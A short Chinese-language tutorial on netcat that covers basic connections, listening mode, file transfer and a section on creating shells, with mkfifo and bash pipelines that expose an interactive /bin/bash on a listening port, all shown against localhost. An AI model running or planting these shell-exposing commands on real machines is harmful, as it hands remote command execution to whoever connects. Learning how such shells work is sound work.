### nc (netcat)  
网络工具，用来在两台机器之间建立TCP/UDP连接，并通过标准的输入输出进行数据的读写  

### 命令  

- `nc www.baidu.com 80`通过命令与百度建立连接

- 'l' 监听模式  
```shell
    nc -l 127.0.0.1 9999  //服务端开启监听模式  
    nc 127.0.0.1 9999 //客户端连接
```

### 创建一个反弹shell  

```shell
#服务端开启循环
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc -l  5879 > /tmp/f   #如果需要客户端关闭后服务端依旧监听，则需要加上参数-k
#客户端连接
nc -v 127.0.0.1 5879


#或者  
#A
nc -lk -p 20000
#B
nc -n 127.0.0.1 20000 <./f |  /bin/bash | tee ./f
#A
pwd #在A上就可以控制B
```

`nc -l 9999 | /bin/bash`   
这里使用Netcat作为服务端监听9999端口，并将接收到的数据通过管道发送给/bin/bash，相当于将/bin/bash暴露到9999端口上，接着在本地机器上执行 
  
虽然我们能使用本地机器传输命令给到目标机器执行，但与ssh连接还是有点区别，因为在本地机器上并不能看到命令的执行结果。可以使用管道巧妙的解决该问题，在目标机器上执行

`$ mkfifo /tmp/pipe  `  

`$ cat /tmp/pipe | /bin/bash 2>&1 | nc -l -p 9999 > /tmp/pipe`
用mkfifo命令创建一个命名管道  

然后通过cat命令读取/tmp/pipe的内容，将内容通过管道发送给/bin/bash   

将/bin/bash的执行结果通过管道发送给nc   

nc将从本地机器上接收到的命令保存到/tmp/pipe中   

/tmp/pipe中的命令又被cat读取，传输到/bin/bash中，至次完成整个数据的流向   

现在在本地机器上就能收到/bin/bash命令的执行结果啦  


### 简单的文件传输  
```shell
# 假如A上的文件text.txt要传输到B上

#B  监听并接收 
nc -l 9999 > text.txt  

#A  连接并发送
nc 127.0.0.1 9999 < text.txt
```


